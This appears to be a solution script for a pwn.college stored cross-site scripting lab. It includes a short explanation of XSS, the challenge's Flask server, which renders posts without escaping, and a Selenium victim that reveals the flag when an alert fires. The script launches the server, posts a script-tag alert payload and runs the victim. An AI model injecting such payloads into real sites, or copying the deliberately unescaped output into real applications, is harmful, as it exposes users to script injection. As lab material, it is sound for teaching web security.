import os
import re
import requests

"""
Theory:
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected
into otherwise benign and trusted websites.
In a typical XSS exploit, an attacker will cause their own code to be injected into
the HTML produced by a web application and viewed by a victim user. This will then allow the
attacker to gain some control within the victim's browser, leading to a number of potential
downstream shenanigans.
You will now have a /challenge/victim program that simulates a victim user visiting the web server.

Note:
Initially xss attacks used to download the malicious scripts run as part of the attack from an
atacker controlled separate website. Hence these attack where called cross site scripting.

Stored xss:
Inspecting the target website, the attacker can see that the site allows to permanently insert
content posts into the websites database. The inserted content is then displayed as html text
in all future requests to the website. The attacker crafts a malicious script and inserts it
as content into the website. All users that visit the target website from now on will trigger
the attack.
"""

'''
Server:
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")

@app.route("/", methods=["POST"])
def challenge_post():
    content = flask.request.form.get("content", "")
    db.execute("INSERT INTO posts VALUES (?)", [content])
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
    page += "<form method=post>Post:<input type=text name=content></form>\n"

    for post in db.execute("SELECT content FROM posts").fetchall():
        page += "<hr>" + post["content"] + "\n"

    return page + "</body></html>"

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)

Victim:
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)
challenge_url = "http://challenge.localhost:80/"
flag = open("/flag").read().strip()

print(f"Visiting {challenge_url}")
browser.get(challenge_url)
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(flag)

'''

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
r1, w1 = os.pipe()
pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r1)

	os.dup2(w1, 1)
	os.close(w1)

	# stdout as stderr
	os.dup2(1, 2)

	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/"
		data = {"content": '<script>alert("PWNED")</script>'}
		resp = requests.post(url, data=data)
		print(resp.text)

		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)
